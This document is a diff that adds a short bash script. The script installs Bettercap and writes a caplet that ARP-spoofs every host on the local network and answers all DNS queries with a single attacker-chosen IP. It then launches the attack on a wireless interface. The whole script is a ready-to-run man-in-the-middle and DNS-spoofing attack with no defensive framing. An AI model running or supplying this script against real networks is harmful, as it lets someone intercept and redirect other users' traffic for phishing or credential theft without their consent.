@@ -1,0 +1,28 @@
+#!/bin/bash
+
+# Variables
+INTERFACE="wlan0"  # Replace with your network interface
+TARGET_IP="192.168.1.100"  # Replace with the IP address you want to redirect all traffic to
+
+# Update and install Bettercap
+echo "[*] Updating system and installing Bettercap..."
+sudo apt update && sudo apt install bettercap -y
+
+# Create the DNS spoof caplet
+CAPLET_PATH="/usr/share/bettercap/caplets/dns_spoof.cap"
+echo "[*] Creating DNS spoof caplet at $CAPLET_PATH..."
+
+cat <<EOT > $CAPLET_PATH
+net.probe on
+set arp.spoof.targets *
+arp.spoof on
+set dns.spoof.all true
+set dns.spoof.address $TARGET_IP
+dns.spoof on
+EOT
+
+echo "[*] Caplet created successfully."
+
+# Start Bettercap with the DNS spoof caplet
+echo "[*] Starting Bettercap..."
+sudo bettercap -iface $INTERFACE -caplet $CAPLET_PATH
